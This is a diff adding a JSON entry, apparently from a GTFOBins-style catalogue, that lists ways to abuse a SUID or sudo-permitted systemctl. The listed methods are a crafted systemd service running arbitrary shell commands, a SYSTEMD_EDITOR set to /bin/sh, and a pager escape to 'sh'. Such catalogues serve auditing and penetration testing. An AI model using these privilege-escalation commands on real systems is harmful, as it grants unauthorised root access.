@@ -1,0 +1,21 @@
+{
+  "functions": {
+    "suid": [
+      {
+        "code": "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"[command] > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice\n"
+      },
+      {
+        "code": "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"[command] > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF\n"
+      },
+      {
+        "description": "This invokes the default pager, which is likely to be 'less', other functions may apply.",
+        "code": "sudo systemctl\n!sh\n"
+      }
+    ]
+  }
+}
